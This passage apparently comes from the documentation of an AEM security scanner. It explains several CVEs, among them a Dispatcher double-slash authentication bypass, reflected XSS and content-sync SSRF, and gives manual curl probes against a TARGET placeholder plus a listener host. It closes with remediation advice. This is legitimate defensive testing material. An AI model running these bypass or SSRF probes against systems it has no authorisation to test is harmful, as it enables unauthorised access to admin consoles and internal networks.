| Adobe bulletin | [APSB23-43](https://helpx.adobe.com/security/products/experience-manager/apsb23-43.html) |

**Why it exists**
The AEM Dispatcher normalises URL paths before applying access-control rules.
By prefixing paths with double slashes (`//system//console//bundles`), an
attacker can reach protected endpoints like the Felix OSGi Console or CRX
Package Manager without authentication, because the Dispatcher's deny rules do
not match the double-slash variant.  This is a bypass of the patch for
CVE-2023-29298.

**Manual curl test**

```bash
# Double-slash Felix Console bypass
curl -sk 'https://TARGET//system//console//bundles' \
  | grep -o 'Web Console - Bundles'

# Double-slash CRX Package Manager bypass
curl -sk 'https://TARGET//crx//packmgr//index.jsp' \
  | grep -o 'CRX Package Manager'
```

Reference: <https://labs.detectify.com/writeups/undocumented-authentication-bypass-issue-in-aem-package-manager-blog-updated/>

---

### 30 · `xss_aem_forms` — Reflected XSS in AEM Forms (CVE-2021-36063)

| Field | Value |
|-------|-------|
| Finding name | `XSS in AEM Forms` |
| Vulnerability class | Reflected Cross-Site Scripting (XSS) |
| CVE | **CVE-2021-36063** |
| CVSS v3.1 | **6.1 (Medium)** |
| Affected versions | AEM Forms 6.5.10.0 and earlier |
| Adobe bulletin | [APSB21-77](https://helpx.adobe.com/security/products/experience-manager/apsb21-77.html) |

**Why it exists**
AEM Forms component endpoints under `/content/forms/af` and
`/libs/fd/af/components` reflected user-controlled input (via URL parameters or
selectors) back into HTML responses without HTML encoding, enabling reflected
XSS attacks against users of AEM Forms-hosted pages.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/content/forms/af.html?test=<1337xss>' \
  | grep -o '<1337xss>'

# Presence of <1337xss> in an HTML response confirms reflected XSS
```

---

### 31 · `xss_reflected_cve_2022` — Reflected XSS in AEM TouchUI (CVE-2022-30677 / CVE-2022-30679)

| Field | Value |
|-------|-------|
| Finding name | `XSS in AEM TouchUI` |
| Vulnerability class | Reflected Cross-Site Scripting (XSS) |
| CVE | **CVE-2022-30677** / **CVE-2022-30679** |
| CVSS v3.1 | **6.1 (Medium)** |
| Affected versions | AEM 6.5.13.0 and earlier |
| Adobe bulletin | [APSB22-40](https://helpx.adobe.com/security/products/experience-manager/apsb22-40.html) |

**Why it exists**
AEM's TouchUI shell and workflow console components at
`/libs/cq/workflow/content/console.html` and related paths reflected URL
selectors or query parameters back into HTML responses without encoding.  An
attacker can craft a URL that executes arbitrary JavaScript in the context of
a logged-in AEM author session.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/libs/cq/gui/content/dnd.html?targetURL=<1337xss>' \
  | grep -o '<1337xss>'

# Presence of <1337xss> in an HTML response confirms reflected XSS
```

---

### 32 · `ssrf_cve_2021_40722` — Unauthenticated SSRF via Content-Sync Endpoint (CVE-2021-40722)

| Field | Value |
|-------|-------|
| Finding name | `SSRF CVE-2021-40722` |
| Vulnerability class | Server-Side Request Forgery (SSRF) |
| CVE | **CVE-2021-40722** |
| CVSS v3.1 | **7.5 (High)** |
| Affected versions | AEM 6.5.10.0 and earlier (on-premise) |
| Adobe bulletin | [APSB21-99](https://helpx.adobe.com/security/products/experience-manager/apsb21-99.html) |

**Why it exists**
The AEM content-sync replication endpoint at
`/libs/cq/contentsync/content/replication` accepts a `path` parameter that is
used to issue a server-side HTTP request without authentication.  An attacker
can force AEM to connect to arbitrary internal hosts, enabling network scanning
and exfiltration of internal service responses.

**Manual curl test**

```bash
curl -sk \
  'https://TARGET/libs/cq/contentsync/content/replication.json?path=http://YOURHOST:YOURPORT/ssrf-hit'

# An inbound connection to your listener confirms SSRF
```

---

## ❌ Known AEM CVEs / Checks NOT Yet Implemented

The following vulnerabilities are not yet covered by the tool.
PRs are welcome — use the CVE test-reproduction issue template at
`.github/ISSUE_TEMPLATE/cve-test-reproduction.yml` to document your
reproduction steps before sending a PR.

### Authentication Bypass / Access Control

| CVE | Type | Severity | Notes | PSIRT Bulletin |
|---|---|---|---|---|
| **CVE-2019-8081** | Auth Bypass | High | Auth bypass in AEM 6.2–6.5; allows unauthenticated access to sensitive JCR content | [APSB19-48](https://helpx.adobe.com/security/products/experience-manager/apsb19-48.html) |
| **CVE-2023-29298** | Auth Bypass | Critical | Dispatcher bypass via `;%0a` suffix in URL path; the patch was itself bypassed by CVE-2023-38205 | [APSB23-31](https://helpx.adobe.com/security/products/experience-manager/apsb23-31.html) |

### SSRF

| CVE | Type | Severity | Notes | PSIRT Bulletin |
|---|---|---|---|---|
| **CVE-2020-3769** | SSRF | High | SSRF in AEM 6.1–6.5 via analytics proxy; leads to internal info disclosure | [APSB20-21](https://helpx.adobe.com/security/products/experience-manager/apsb20-21.html) |

### Stored / DOM XSS

| CVE | Type | Severity | Notes | PSIRT Bulletin |
|---|---|---|---|---|
| **CVE-2021-21083** | Stored XSS | High | Stored XSS in AEM 6.4–6.5 via DAM asset upload | [APSB21-15](https://helpx.adobe.com/security/products/experience-manager/apsb21-15.html) |
| **CVE-2021-28581** | Stored XSS | High | Stored XSS in AEM 6.5 | [APSB21-33](https://helpx.adobe.com/security/products/experience-manager/apsb21-33.html) |
| **CVE-2022-35693** | Stored XSS | Medium | Stored XSS in AEM 6.5.14.0 and earlier | [APSB22-53](https://helpx.adobe.com/security/products/experience-manager/apsb22-53.html) |
| **CVE-2023-48445 – CVE-2023-48452** | Multiple XSS (batch) | Medium | Eight XSS CVEs in AEM 6.5.18.0 and earlier | [APSB24-05](https://helpx.adobe.com/security/products/experience-manager/apsb24-05.html) |

### Reflected XSS (additional, post-2022)

| CVE | Type | Severity | Notes | PSIRT Bulletin |
|---|---|---|---|---|
| **CVE-2022-30681–30686** | Reflected XSS (batch) | Medium | Six additional reflected XSS in AEM 6.5.13.0 not yet individually checked | [APSB22-40](https://helpx.adobe.com/security/products/experience-manager/apsb22-40.html) |

---

## Remediation Summary

| Risk | Recommended Fix |
|------|----------------|
| **Default credentials** | Change admin/author/service passwords immediately on every environment. |
| **Development consoles** | Disable CRXDE Lite, CRX Explorer, Package Manager, Groovy Console, ACS Tools on non-development instances. |
| **Exposed servlets** | Enforce authentication on all `/bin/*`, `/libs/*`, `/system/console/*` paths via the Dispatcher allow-list and OSGi authentication requirements. |
| **SSRF endpoints** | Patch to the latest AEM Service Pack; add outbound network egress controls. |
| **Dispatcher bypasses** | Apply the latest dispatcher rules; update to AEM 6.5.18+ for CVE-2023-38205. |
| **Open redirect** | Update to AEM 6.5.17+; validate the `resource` parameter server-side. |
| **Flash / SWF files** | Add `Content-Disposition: attachment` to SWF responses, or delete the clientlibs entirely. |
| **Java deserialization** | Patch to AEM 6.4+ or apply CIF deserialization firewall; restrict access to `/libs/dam/cloud/proxy`. |
| **WebDAV** | Upgrade to Jackrabbit 2.10.1+ (bundled in AEM 6.1 SP2+) or disable the WebDAV servlet via OSGi. |
| **XXE (AEM Forms)** | Apply APSB19-48 patch; update to AEM 6.4.5+ or 6.5.1+. |
| **Version disclosure** | Remove or restrict access to login page metadata; disable `/system/console/productinfo` on production. |

---

## References

* [Adobe Security Bulletins](https://helpx.adobe.com/security/products/experience-manager.html)
* [NVD – Adobe Experience Manager](https://nvd.nist.gov/vuln/search/results?query=adobe+experience+manager)
* [CVEDetails – AEM](https://www.cvedetails.com/product/33138/Adobe-Experience-Manager.html)
* [Detectify: CRX Package Manager Auth Bypass (2021)](https://labs.detectify.com/writeups/undocumented-authentication-bypass-issue-in-aem-package-manager-blog-updated/)
* Mikhail Egorov – *Hunting for Security Bugs in AEM Web Apps* (Hacktivity 2018):
  <https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps>
* Frans Rosén – *A Story of the Passive-Aggressive Sysadmin of AEM*:
  <https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem>
* NVD CVE-2015-1833: <https://nvd.nist.gov/vuln/detail/CVE-2015-1833>
* NVD CVE-2016-7882: <https://nvd.nist.gov/vuln/detail/CVE-2016-7882>
* NVD CVE-2018-5006: <https://nvd.nist.gov/vuln/detail/CVE-2018-5006>
* NVD CVE-2018-12809: <https://nvd.nist.gov/vuln/detail/CVE-2018-12809>
* NVD CVE-2019-8086: <https://nvd.nist.gov/vuln/detail/CVE-2019-8086>
* NVD CVE-2021-36063: <https://nvd.nist.gov/vuln/detail/CVE-2021-36063>
* NVD CVE-2021-40722: <https://nvd.nist.gov/vuln/detail/CVE-2021-40722>
* NVD CVE-2022-30677: <https://nvd.nist.gov/vuln/detail/CVE-2022-30677>
* NVD CVE-2023-29297: <https://nvd.nist.gov/vuln/detail/CVE-2023-29297>
* NVD CVE-2023-38205: <https://nvd.nist.gov/vuln/detail/CVE-2023-38205>
